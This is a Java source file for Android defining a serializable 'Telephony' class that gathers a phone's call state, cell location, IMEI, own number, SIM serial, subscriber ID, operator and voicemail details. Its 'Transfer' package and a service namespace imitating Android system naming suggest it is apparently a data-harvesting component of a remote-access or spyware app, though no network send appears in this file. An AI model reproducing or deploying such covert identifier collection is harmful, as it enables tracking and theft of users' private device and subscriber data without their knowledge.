package Transfer;

import android.content.Context;
import android.os.Build.VERSION;
import android.telephony.TelephonyManager;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;

import static android.telephony.TelephonyManager.CALL_STATE_IDLE;
import static android.telephony.TelephonyManager.CALL_STATE_OFFHOOK;
import static android.telephony.TelephonyManager.CALL_STATE_RINGING;
import static android.telephony.TelephonyManager.DATA_ACTIVITY_DORMANT;
import static android.telephony.TelephonyManager.DATA_ACTIVITY_IN;
import static android.telephony.TelephonyManager.DATA_ACTIVITY_INOUT;
import static android.telephony.TelephonyManager.DATA_ACTIVITY_NONE;
import static android.telephony.TelephonyManager.DATA_ACTIVITY_OUT;
import static android.telephony.TelephonyManager.DATA_CONNECTED;
import static android.telephony.TelephonyManager.DATA_CONNECTING;
import static android.telephony.TelephonyManager.DATA_DISCONNECTED;
import static android.telephony.TelephonyManager.DATA_SUSPENDED;
import static android.telephony.TelephonyManager.NETWORK_TYPE_1xRTT;
import static android.telephony.TelephonyManager.NETWORK_TYPE_CDMA;
import static android.telephony.TelephonyManager.NETWORK_TYPE_EDGE;
import static android.telephony.TelephonyManager.NETWORK_TYPE_EHRPD;
import static android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_0;
import static android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_A;
import static android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_B;
import static android.telephony.TelephonyManager.NETWORK_TYPE_GPRS;
import static android.telephony.TelephonyManager.NETWORK_TYPE_HSDPA;
import static android.telephony.TelephonyManager.NETWORK_TYPE_HSPA;
import static android.telephony.TelephonyManager.NETWORK_TYPE_HSPAP;
import static android.telephony.TelephonyManager.NETWORK_TYPE_HSUPA;
import static android.telephony.TelephonyManager.NETWORK_TYPE_IDEN;
import static android.telephony.TelephonyManager.NETWORK_TYPE_LTE;
import static android.telephony.TelephonyManager.NETWORK_TYPE_UMTS;
import static android.telephony.TelephonyManager.NETWORK_TYPE_UNKNOWN;
import static android.telephony.TelephonyManager.PHONE_TYPE_CDMA;
import static android.telephony.TelephonyManager.PHONE_TYPE_GSM;
import static android.telephony.TelephonyManager.PHONE_TYPE_NONE;
import static android.telephony.TelephonyManager.PHONE_TYPE_SIP;
import static android.telephony.TelephonyManager.SIM_STATE_ABSENT;
import static android.telephony.TelephonyManager.SIM_STATE_NETWORK_LOCKED;
import static android.telephony.TelephonyManager.SIM_STATE_PIN_REQUIRED;
import static android.telephony.TelephonyManager.SIM_STATE_PUK_REQUIRED;
import static android.telephony.TelephonyManager.SIM_STATE_READY;
import static android.telephony.TelephonyManager.SIM_STATE_UNKNOWN;

public class Telephony implements Serializable {

  public String CALLSTATE;
  public String CELLLOCATION;
  public String DATAACTIVITY;
  public String DATASTATE;
  public String DEVICEID;
  public String DEVICESOFTWAREVERSION;
  public String GROUPIDLEVEL1;
  public String LINE1NUMBER;
  public String MMSUAPROOFURL;
  public String MMSUSERAGENT;
  public String NETWORKCOUNTRYISO;
  public String NETWORKOPERATOR;
  public String NETWORKOPERATORNAME;
  public String NETWORKTYPE;
  public String PHONETYPE;
  public String SIMCOUNTRYISO;
  public String SIMOPERATOR;
  public String SIMOPERATORNAME;
  public String SIMSERIALNUMBER;
  public String SIMSTATE;
  public String SUBSCRIBERID;
  public String VOICEMAILALPHATAG;
  public String VOICEMAILNUMBER;

  public Telephony() {
    try {
      TelephonyManager telephonyManager =
          (TelephonyManager) MyService.context.getSystemService(Context.TELEPHONY_SERVICE);
      if (telephonyManager.getCallState() == CALL_STATE_IDLE) {
        CALLSTATE = "Idle";
      } else if (telephonyManager.getCallState() == CALL_STATE_OFFHOOK) {
        CALLSTATE = "Offhook";
      } else if (telephonyManager.getCallState() == CALL_STATE_RINGING) {
        CALLSTATE = "Ringing";
      }

      CELLLOCATION = telephonyManager.getCellLocation().toString();

      if (telephonyManager.getDataActivity() == DATA_ACTIVITY_DORMANT) {
        DATAACTIVITY = "Dormant";
      } else if (telephonyManager.getDataActivity() == DATA_ACTIVITY_IN) {
        DATAACTIVITY = "In";
      } else if (telephonyManager.getDataActivity() == DATA_ACTIVITY_INOUT) {
        DATAACTIVITY = "In Out";
      } else if (telephonyManager.getDataActivity() == DATA_ACTIVITY_NONE) {
        DATAACTIVITY = "None";
      } else if (telephonyManager.getDataActivity() == DATA_ACTIVITY_OUT) {
        DATAACTIVITY = "Out";
      }

      if (telephonyManager.getDataState() == DATA_SUSPENDED) {
        DATASTATE = "Supsended";
      } else if (telephonyManager.getDataState() == DATA_CONNECTED) {
        DATASTATE = "Connected";
      } else if (telephonyManager.getDataState() == DATA_CONNECTING) {
        DATASTATE = "Connecting";
      } else if (telephonyManager.getDataState() == DATA_DISCONNECTED) {
        DATASTATE = "Disconnected";
      }

      DEVICEID = telephonyManager.getDeviceId();
      DEVICESOFTWAREVERSION = telephonyManager.getDeviceSoftwareVersion();

      if (VERSION.SDK_INT >= 18) {
        GROUPIDLEVEL1 = telephonyManager.getGroupIdLevel1();
      } else {
        GROUPIDLEVEL1 = "N/A";
      }

      LINE1NUMBER = telephonyManager.getLine1Number();

      if (VERSION.SDK_INT >= 19) {
        MMSUAPROOFURL = telephonyManager.getMmsUAProfUrl();
        MMSUSERAGENT = telephonyManager.getMmsUserAgent();
      } else {
        MMSUAPROOFURL = "N/A";
        MMSUSERAGENT = "N/A";
      }

      NETWORKCOUNTRYISO = telephonyManager.getNetworkCountryIso();
      NETWORKOPERATOR = telephonyManager.getNetworkOperator();
      NETWORKOPERATORNAME = telephonyManager.getNetworkOperatorName();

      if (telephonyManager.getNetworkType() == NETWORK_TYPE_1xRTT) {
        NETWORKTYPE = "1xRTT";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_CDMA) {
        NETWORKTYPE = "CDMA";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_EDGE) {
        NETWORKTYPE = "EDGE";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_EHRPD) {
        NETWORKTYPE = "eHRPD";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_EVDO_0) {
        NETWORKTYPE = "EDVO revision 0";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_EVDO_A) {
        NETWORKTYPE = "EDVO revision A";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_EVDO_B) {
        NETWORKTYPE = "EDVO revision B";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_GPRS) {
        NETWORKTYPE = "GPRS";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_HSDPA) {
        NETWORKTYPE = "HSDPA";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_HSPA) {
        NETWORKTYPE = "HSPA";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_HSPAP) {
        NETWORKTYPE = "HSPA+";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_HSUPA) {
        NETWORKTYPE = "HSUPA";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_IDEN) {
        NETWORKTYPE = "iDen";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_LTE) {
        NETWORKTYPE = "LTE";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_UMTS) {
        NETWORKTYPE = "UMTS";
      } else if (telephonyManager.getNetworkType() == NETWORK_TYPE_UNKNOWN) {
        NETWORKTYPE = "Unknown";
      }

      if (telephonyManager.getPhoneType() == PHONE_TYPE_CDMA) {
        PHONETYPE = "CDMA";
      } else if (telephonyManager.getPhoneType() == PHONE_TYPE_GSM) {
        PHONETYPE = "GSM";
      } else if (telephonyManager.getPhoneType() == PHONE_TYPE_NONE) {
        PHONETYPE = "NONE";
      } else if (telephonyManager.getPhoneType() == PHONE_TYPE_SIP) {
        PHONETYPE = "SIP";
      }

      SIMCOUNTRYISO = telephonyManager.getSimCountryIso();
      SIMOPERATOR = telephonyManager.getSimOperator();
      SIMOPERATORNAME = telephonyManager.getSimOperatorName();
      SIMSERIALNUMBER = telephonyManager.getSimSerialNumber();

      if (telephonyManager.getSimState() == SIM_STATE_ABSENT) {
        SIMSTATE = "Absent";
      } else if (telephonyManager.getSimState() == SIM_STATE_NETWORK_LOCKED) {
        SIMSTATE = "Network locked";
      } else if (telephonyManager.getSimState() == SIM_STATE_PIN_REQUIRED) {
        SIMSTATE = "Pin required";
      } else if (telephonyManager.getSimState() == SIM_STATE_PUK_REQUIRED) {
        SIMSTATE = "Puk required";
      } else if (telephonyManager.getSimState() == SIM_STATE_READY) {
        SIMSTATE = "Ready";
      } else if (telephonyManager.getSimState() == SIM_STATE_UNKNOWN) {
        SIMSTATE = "Unknown";
      }

      SUBSCRIBERID = telephonyManager.getSubscriberId();
      VOICEMAILALPHATAG = telephonyManager.getVoiceMailAlphaTag();
      VOICEMAILNUMBER = telephonyManager.getVoiceMailNumber();
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
